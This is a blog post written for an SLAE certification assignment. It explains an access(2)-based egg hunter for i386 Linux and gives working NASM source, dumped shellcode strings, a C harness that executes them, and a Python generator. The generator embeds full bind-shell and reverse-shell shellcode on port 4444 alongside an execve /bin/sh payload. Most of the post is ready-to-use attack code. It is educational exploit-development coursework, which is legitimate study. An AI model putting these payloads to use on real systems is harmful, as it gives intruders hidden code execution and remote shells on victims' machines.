---
layout: post
author: thesp0nge
title: "Assignment #3: An Egg Hunter journey"
tags: [slae, shellcode, egg hunter, assembler, i386]
comments: true
category: [slae]
share: true
order: 3
---

The third assignment for SLAE certification is a study for an egg hunter
shellcode. Within this study a working proof of concept code it must be written
and it must support different payloads.

The assignment was written on an Ubuntu Linux 18.04, with a Linux kernel 4.15
version.

## The theory behind the egg hunter

The masterpiece about egg hunting theory is the [Safely Searching Process
Virtual Address
Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) paper.

The basic idea is simple: you don't have enough space where to store your evil
payload, so you have to brake it into *two* different stages:

* the first stage is called the egg hunter and its purpose is to search the
  memory for a specific identifier, the egg, and when it found it, to pass the
  control to the second stage payload;

* the second stage that it starts with the egg repeated two times, as a marker,
  and then it contains the evil code to be executed.

I choose to implement the hunter based on the access(2) system call in its
revised version, mainly because I don't want to rely on an executable EGG.
True to be told, 0xdeadbeef is my chosen default key.

The key idea is to scan the whole memory, using the access(2) system call that
it has the real purpose to check and see if the current process has the
specific access rights to a given file on disk.

## The proof of concept

First of all, I'll make very few modifications to our execve("/bin/sh")
shellcode. In fact, I'll add only the EGG marker repeated twice.

{% highlight assembly %}
; Filename: 	execve.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the default payload for the egg hunter demo. It will
; 		      execute "/bin/sh" using execve() system call.

global _start

dd 0xdeadbeef
dd 0xdeadbeef

section .text

_start:
	xor eax, eax		; init EAX to 0
	push eax		    ; pushing 0 to the stack to be used as NULL pointer

	; execve is defined as #define __NR_execve 11 in
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is:
  ; int execve(const char *filename, char *const argv[], char *const envp[]);


	push 0x68732f2f		; pushing //bin/sh into the stack
	push 0x6e69622f		; the init double / is for alignment purpose

	mov ebx, esp		; pointer to *filename
	push eax		    ; pushing in the stack a pointer to NULL
	mov edx, esp		; I don't care about environment here
	push eax
	mov ecx, esp		; I don't even care about passing arguments to
				          ; my /bin/sh

	mov al, 0xb		; execve = 11
	int 0x80
{% endhighlight %}

After having compiled the assembler source file with compile.sh script shell, I
used scdump.sh script to dump the shellcode.

{%highlight sh%}
"\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"
{%endhighlight%}

This will be our default payload to be executed when the EGG it has been found
in memory. Now, let's have a look to our egg hunter implementation.

{% highlight assembly %}
; Filename: 	egghunter.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the first stage of our payload. An egg-hunter shellcode
;		looping through memory and jumping on the payload after the
;		second egg found in memory.

global _start

section .text

_start:

	xor ecx, ecx
	mul ecx

next_page:
	or dx, 0xfff

next_addr:
	; EDX is 4096 here, that is the value of PAGE_SIZE constant
	inc edx

	; EBX is our memory cursor
	lea ebx, [edx+0x4]

	xor eax, eax

	; access is defined as #define __NR_acces 33 in
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is:
	; int access(const char *pathname, int mode);

	mov al, 0x21
	int 0x80

	cmp al, 0xf2		; 0xf2 is the opcode for EFAULT. If my register
				; has this value, a signal for a invalid page
				; access it has been received
	jz next_page

	mov eax, key
	mov edi, edx
	scasd

	jnz next_addr

	scasd
	jnz next_addr

	; At this point we are at the very beginning of our shellcode, after
	; the second key. We can jump to it
	jmp edi

section .data
	key equ 0xdeadbeef

{% endhighlight %}

The basic idea here is to traverse memory using EBX register as pointer and
access() system call to check if we're pointing a memory region we're allowed
to read. In this case we are in one of our process memory page and than our
second stage can be found there.


Dumping the shellcode I obtained:

{%highlight sh %}
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\xef\xbe\xad\xde\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7"
{%endhighlight %}

I added this shellcode into the same C program used in the first assignment to
test our shellcode and I executed it in order to check the payload is correct.

{%highlight c%}
#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\xef\xbe\xad\xde\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7";

unsigned char code[] = \
"\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80";


int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	printf("Egghunter Length:  %d\n", strlen(egg_hunter));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}

{% endhighlight %}

## The configurator

The most interesting part here is to give the shellcode flexibility for the
second stage payload to be executed. The basic idea is to have three different
payloads:

* execve("/bin/sh")
* TCP Bind shell shellcode on port 4444
* TCP Reverse shell shellcode on localhost port 4444

Here it is the python script I used to create different C programs containing
different payloads. Please note that I added also a function to change the EGG
value.

{% highlight python %}
#!/usr/bin/env python

import sys, getopt, binascii, fileinput, re;

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-s, --shell: use /bin/sh shellcode"
    print "\t-b, --bind-shell: use a TCP bind shell shellcode on port 4444"
    print "\t-r, --reverse-shell: use a TCP reverse shell shellcode on 127.0.0.1 on port 4444"
    print "\t-e, --egg=the_egg_string: use the given string as egg in memory"
    return 0

def main(argv):

    try:
        opts, args=getopt.getopt(argv, "hsbre:", ["help", "shell", "bind-shell", "reverse-shell", "egg="])
    except getopt.GetoptError:
        help()
        sys.exit(1)

    egg = "\\xef\\xbe\\xad\\xde"
    default_shellcode="\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x50\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    shellcode=egg+egg+default_shellcode

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-s', '--shell'):
            shellcode=egg+egg+default_shellcode
        elif opt in ('-b', '--bind-shell'):
            shellcode=egg+egg+"\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
        elif opt in ('-r', '--reverse-shell'):
            shellcode=egg+egg+"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\xb8\\x80\\xff\\xff\\xfe\\x83\\xf0\\xff\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x24\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xb3\\x01\\x31\\xc0\\xb0\\x01\\xcd\\x80"
        elif opt in ('-e', '--egg'):
            egg=repr(binascii.unhexlify(arg[::-1])).strip("'")

    egg_hunter="\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x31\\xc0\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x74\\xed\\xb8"+egg+"\\x89\\xd7\\xaf\\x75\\xe8\\xaf\\x75\\xe5\\xff\\xe7";

    sys.stderr.write("Egg Hunter: " + egg_hunter+"\n")
    sys.stderr.write("Shellcode:  " +shellcode+"\n")

    with open('skeleton.c', 'r') as file :
        filedata=file.read()
    filedata = filedata.replace("EGG_HUNTER", egg_hunter)
    filedata = filedata.replace("CODE", shellcode)

    print filedata

if __name__ == "__main__":
    main(sys.argv[1:])

{% endhighlight %}

## Code in action


In this video, you can see the very default payload executing /bin/sh after the
EGG being found in memory.

{% asciicast 184329 %}

Here, the payload is a TCP bind shellcode on port 4444 on localhost, developed
for the [first SLAE
assignment](https://codiceinsicuro.it/slae/assignment-1-create-a-bind-shellcode/)

{% asciicast 184330 %}

This video shows the payload for a TCP reverse shell shellcode on localhost on
port 4444 developed for the [second SLAE
assignment](https://codiceinsicuro.it/slae/assignment-2-create-a-reverse-shellcode/)
{% asciicast 184331 %}

And in the last video, I show the default payload but with a different EGG.
{% asciicast 184332 %}

## SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1217
